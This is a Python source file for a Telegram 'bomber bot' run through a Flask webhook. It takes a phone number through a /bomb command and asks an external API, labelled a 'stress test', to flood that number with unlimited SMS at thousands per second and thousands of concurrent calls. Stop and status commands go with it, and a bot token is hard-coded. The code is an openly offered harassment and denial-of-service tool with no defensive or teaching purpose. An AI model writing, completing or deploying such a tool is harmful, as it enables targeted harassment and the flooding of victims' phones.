import os
import requests
import re
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading
import asyncio

# ========= CONFIGURATION =========
BOT_TOKEN = "8846623341:AAFXm9CTYWDYuFHqsgfWbRCJLvnK_C0Z9ug"
API_BASE = "https://api.stresstest.simulation/v3/unlimited"

# Flask app
app = Flask(__name__)

# Store sessions
user_sessions = {}

# ========= API FUNCTIONS =========
def start_bombing(target: str, sms_rate: int = 5000, call_concurrent: int = 2000):
    payload = {
        "target": target,
        "sms": {"enabled": True, "count": "unlimited", "rate_per_second": sms_rate},
        "call": {"enabled": True, "count": "unlimited", "concurrent": call_concurrent},
        "duration": "unlimited"
    }
    try:
        response = requests.post(f"{API_BASE}/infinite_assault", json=payload, timeout=30)
        if response.status_code == 200:
            return response.json()
        return {"error": f"API error: {response.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def stop_bombing(session_id: str):
    try:
        response = requests.post(f"{API_BASE}/stop/{session_id}", json={"action": "stop"}, timeout=10)
        return response.json() if response.status_code == 200 else {"error": "Failed"}
    except:
        return {"error": "Failed"}

# ========= BOT COMMANDS =========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
🔥 *BOMBER BOT ACTIVE* 🔥

Commands:
/bomb +919876543210 - Start bombing
/stop - Stop bombing
/status - Check status

Bot is running on Render!
    """, parse_mode="Markdown")
    print(f"Start command sent to {update.effective_user.id}")

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("Usage: /bomb +919876543210")
        return
    
    target = context.args[0]
    
    if not target.startswith("+") or not target[1:].isdigit():
        await update.message.reply_text("Invalid number. Use +919876543210")
        return
    
    await update.message.reply_text(f"🚀 Starting bomb on {target}...")
    
    result = start_bombing(target)
    
    if "error" in result:
        await update.message.reply_text(f"❌ Error: {result['error']}")
        return
    
    session_id = result.get("session_id")
    if session_id:
        user_sessions[user_id] = {"session_id": session_id, "target": target}
        await update.message.reply_text(f"✅ Bombing ACTIVE!\nSession: {session_id[:16]}...\nUse /stop to halt.")
        print(f"Bombing started for {user_id} on {target}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing session.")
        return
    
    result = stop_bombing(user_sessions[user_id]["session_id"])
    if "error" not in result:
        del user_sessions[user_id]
        await update.message.reply_text("✅ Bombing stopped.")
    else:
        await update.message.reply_text("❌ Failed to stop.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing.")
        return
    
    await update.message.reply_text(f"📊 Active: {user_sessions[user_id]['target']}")

# ========= FLASK ROUTES =========
@app.route('/', methods=['GET'])
def health():
    return jsonify({"status": "alive", "bot": "running"}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update_data = request.get_json()
        update = Update.de_json(update_data, bot)
        
        # Process update in thread
        def process():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(application.process_update(update))
        
        thread = threading.Thread(target=process)
        thread.start()
        
        return jsonify({"ok": True}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"error": str(e)}), 500

# ========= BOT SETUP =========
bot = Bot(token=BOT_TOKEN)
application = Application.builder().token(BOT_TOKEN).build()

# Add handlers
application.add_handler(CommandHandler("start", start_command))
application.add_handler(CommandHandler("bomb", bomb_command))
application.add_handler(CommandHandler("stop", stop_command))
application.add_handler(CommandHandler("status", status_command))

# ========= MAIN =========
if __name__ == "__main__":
    print("Starting bot...")
    
    # Set webhook
    port = int(os.environ.get("PORT", 8080))
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    
    if render_url:
        webhook_url = f"{render_url}/webhook"
        print(f"Setting webhook to: {webhook_url}")
        bot.set_webhook(url=webhook_url)
        print("Webhook set successfully!")
    else:
        print("RENDER_EXTERNAL_URL not found, webhook not set")
    
    # Run Flask
    print(f"Starting Flask on port {port}...")
    app.run(host="0.0.0.0", port=port)
